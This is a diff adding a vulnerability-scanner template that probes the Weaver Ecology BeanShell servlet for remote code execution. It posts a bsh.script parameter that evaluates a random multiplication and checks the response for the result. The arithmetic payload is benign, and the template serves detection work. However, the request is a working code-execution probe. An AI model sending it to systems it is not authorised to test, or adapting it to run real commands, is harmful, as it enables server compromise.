@@ -1,0 +1,31 @@
+id: poc-yaml-ecology-javabeanshell-rce
+info:
+  name: Ecology Javabeanshell Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    This template checks for remote code execution in Ecology Javabeanshell by evaluating arithmetic expressions in the response.
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+  expected_result: "{{to_number(r1) * to_number(r2)}}"
+
+http:
+  - raw:
+      - |
+        POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=print({{r1}}*{{r2}})&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{expected_result}}"
+        part: body
